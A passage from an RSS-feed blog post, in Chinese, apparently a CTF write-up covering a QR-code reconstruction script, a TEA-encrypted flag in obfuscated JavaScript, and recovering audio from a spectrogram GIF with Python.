class=&#34;number&#34;&gt;1&lt;/span&gt;&amp;lt;&amp;lt;(EACH*EACH)):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                tmp = calcDelta(i, j, filN, pre_arr[X+i*MSBLOCK+&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;][Y+j*MSBLOCK+&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;],LUR,LUC)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; tmp &amp;lt; &lt;span class=&#34;number&#34;&gt;0.00000001&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    succnt = succnt + &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    nowSol = filN&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; succnt == &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; x &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(LUR,LUR+EACH) :&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; y &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(LUC,LUC+EACH):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    kimeta[x][y] = &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    res_arr[x][y]=nowSol&amp;amp;&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    nowSol = nowSol&amp;gt;&amp;gt;&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;dfs(&lt;span class=&#34;number&#34;&gt;5&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;5&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,SIZE):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; j &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,SIZE):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        new_arr[i][j]=res_arr[i//QRBLOCK][j//QRBLOCK]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;MatrixToImage(np.array(new_arr)).save(&lt;span class=&#34;string&#34;&gt;&amp;#x27;resu.bmp&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;最终效果：&lt;img src=&#34;https://img2020.cnblogs.com/blog/1335480/202110/1335480-20211030160204036-1937509495.jpg&#34; alt=&#34;QRCode&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;minecRaft&#34;&gt;&lt;a href=&#34;#minecRaft&#34; class=&#34;headerlink&#34; title=&#34;minecRaft&#34;&gt;&lt;/a&gt;minecRaft&lt;/h2&gt;&lt;p&gt;web× reverse√&lt;br&gt;打开网页查看js，找到flag.js，在&lt;a href=&#34;http://jsnice.org/&#34;&gt;jsnice.org&lt;/a&gt;反混淆后自己手动再替换下几个迷人眼的常量，之后进行代码审计，会发现这是个TEA加密。如何发现是TEA呢？我搜了好久，后来有人告诉我只需要搜常量就行（还需要学习一个人生经验）。&lt;br&gt;我们需要找到一个字符串s，使得s.encrypt(“{那串数字密钥}”)&amp;#x3D;&amp;#x3D;&amp;#x3D; “6f……0c”&lt;br&gt;把密文切片避免转换后数字过大，在题目页面下&lt;code&gt;F12&lt;/code&gt;，进入Console里执行：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;javascript&#34;&gt;window.btoa(LongToStr4(Base16ToLong(&amp;#39;6fbde674&amp;#39;))+LongToStr4(Base16ToLong(&amp;#39;819a59bf&amp;#39;))+LongToStr4(Base16ToLong(&amp;#39;a1209256&amp;#39;))+LongToStr4(Base16ToLong(&amp;#39;5b4ca2a7&amp;#39;))+LongToStr4(Base16ToLong(&amp;#39;a11dc670&amp;#39;))+LongToStr4(Base16ToLong(&amp;#39;c678681d&amp;#39;))+LongToStr4(Base16ToLong(&amp;#39;af4afb67&amp;#39;))+LongToStr4(Base16ToLong(&amp;#39;04b82f0c&amp;#39;)))
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;得到密文dOa9b79ZmoFWkiChp6JMW3DGHaEdaHjGZ&amp;#x2F;tKrwwvuAQ&amp;#x3D;&lt;br&gt;谷歌&lt;code&gt;TEA decryption online&lt;/code&gt;，进入&lt;a href=&#34;https://www.mefancy.com/obfuscation/encryption-generator.php&#34;&gt;https://www.mefancy.com/obfuscation/encryption-generator.php&lt;/a&gt;把上面那串数字密钥（13…）还有密文丢进去就出flag了。&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;p😭q&#34;&gt;&lt;a href=&#34;#p😭q&#34; class=&#34;headerlink&#34; title=&#34;p😭q&#34;&gt;&lt;/a&gt;p😭q&lt;/h2&gt;&lt;p&gt;老外大奥流泪.gif  早知道，还是原道.jpg&lt;br&gt;先把gif的帧提取出来方便处理：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;python&#34;&gt;import os
import sys
from PIL import Image

def extractFrames(inGif, outFolder):
    frame = Image.open(inGif)
    nframes = 0
    while frame:
        frame.save(&amp;#39;./dest/%s.png&amp;#39; % (nframes))
        nframes += 1
        try:
            frame.seek(nframes)
        except EOFError:
            break;
    return True

if __name__ == &amp;#39;__main__&amp;#39;:
    image = os.path.abspath(sys.argv[1])
    dest = os.path.join(os.path.dirname(image), &amp;quot;dest&amp;quot;)
    if not os.path.exists(dest):
        os.mkdir(dest)
    extractFrames(image, dest)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;然后原题给啥库就用啥库，逆回去：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;python&#34;&gt;from array2gif import write_gif  # version: 1.0.4
import librosa  # version: 0.8.1
import numpy as np  # version: 1.19.5
import soundfile as sf
from PIL import Image
import matplotlib.pyplot as plt

def ImageToMatrix(filename):
    im = Image.open(filename)
    height,width = im.size
    im = im.convert(&amp;#39;L&amp;#39;)
    data = im.getdata()
    data = np.matrix(data,dtype=&amp;#39;float&amp;#39;)/255.0
    new_data = np.reshape(data,(width,height))
    return new_data
np.set_printoptions(threshold=1145141919810)
num_freqs = 32
quantize = 2
min_db = -60
max_db = 30
fft_window_size = 2048
frame_step_size = 512
window_function_type = &amp;#39;hann&amp;#39;
red_pixel = [255, 0, 0]
white_pixel = [255, 255, 255]
sample_rate = 22050
lis =  [[0.0 for col in range(587)] for row in range(32)]
imgg = [[0.0 for col in range(130)] for row in range(92)]
for ii in range (0,587):
    filename = &amp;#39;./dest/%s.png&amp;#39;%ii
    print(filename)
    data = ImageToMatrix(filename)
    for i in range(0,92):
        for j in range(0,130):
            imgg[i][j]=data.tolist()[i][j]
    for xpos in range(0,32):
        for scan in range(0,92):
            if imgg[scan][xpos*4+2]&amp;lt;1.0:  
                lis[xpos][ii]=float((91-scan)-60)
                break

spectrogram =  np.array(lis)
audio_signal = librosa.feature.inverse.mel_to_audio(librosa.db_to_power(spectrogram), sr=sample_rate, n_fft=fft_window_size*2, hop_length=frame_step_size, window=window_function_type)
sf.write(&amp;#39;newnew.wav&amp;#39;, audio_signal, sample_rate) 
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;最后在Adobe Audition CC里随便处理处理，勉强能听了，开始努力听写：&lt;br&gt;&lt;code&gt;Theflagis f,l,a,g ......&lt;/code&gt;  &lt;/p&gt;
 ]]></description>
        </item>
    </channel>
</rss>
